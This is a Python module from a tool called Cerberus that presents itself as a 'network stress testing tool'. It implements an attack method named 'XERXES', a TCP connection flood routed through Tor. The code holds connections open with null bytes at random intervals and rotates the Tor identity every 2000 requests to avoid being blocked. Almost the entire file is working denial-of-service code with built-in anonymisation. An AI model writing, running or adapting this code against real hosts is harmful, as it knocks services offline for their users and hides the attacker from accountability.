'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, ssl

from python_socks.sync import Proxy
from random import uniform
from urllib.parse import urlparse

from src.core import Core
from src.utils import *
from src.useragent import *

def flood(attack_id, url, stoptime) -> None:

    if not Core.target_host: Core.target_host = urlparse(url).hostname # set host if not already set
    if not Core.target_port: Core.target_port = urlparse(url).port if urlparse(url).port else (80 if urlparse(url).scheme == 'http' else 443) # set port if not already set
    
    if not Core.is_tor_active: # TOR dead? (re)launch it
        utils().launch_tor()

    socket = None

    connected = False
    for _ in range(20): # try to restart TOR atleast 20 times
        if connected: break

        try: 
            proxy = Proxy.from_url('socks5://127.0.0.1:9049') # set the proxy to the port in "src/files/Tor/torrc"
            connected = True

        except Exception:
            utils().launch_tor() # launch tor
            continue
    
    if not connected:
        return

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        if Core.change_identity >= 2000: # if the counter reaches 2000, we change the TOR identity/circuit
            Core.change_identity = 0 # reset
            utils().new_identity()
            Core.infodict[attack_id]['identities_changed'] += 1

        try:

            if not socket: # if the socket has not been defined yet, we create a new socket and wrap it with the TOR proxy
                socket = proxy.connect(Core.target_host, Core.target_port) # connect

                if Core.target_port == 443: # if the port is HTTPS (HTTP over SSL/TLS), wrap the socket
                    socket = ssl.create_default_context().wrap_socket(
                        sock=socket,
                        server_hostname=Core.target_host
                    )

                Core.infodict[attack_id]['conn_opened'] += 1 # count a new connection

            try:
                socket.sendall(b'\0') # send a tiiiiny bit of data to keep the connection open

                Core.infodict[attack_id]['req_sent'] += 1
                time.sleep(uniform(3,6))
            except Exception: #as e:
                socket.close() # close connection
                socket = None # reset the socket variable

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['total'] += 1
        Core.change_identity += 1

    socket.close() # close the socket, incase it was still open
    Core.threadcount -= 1

Core.methods.update({
    'XERXES': {
        'info': 'TCP connection flood, abusing the TOR network',
        'func': flood
    }
})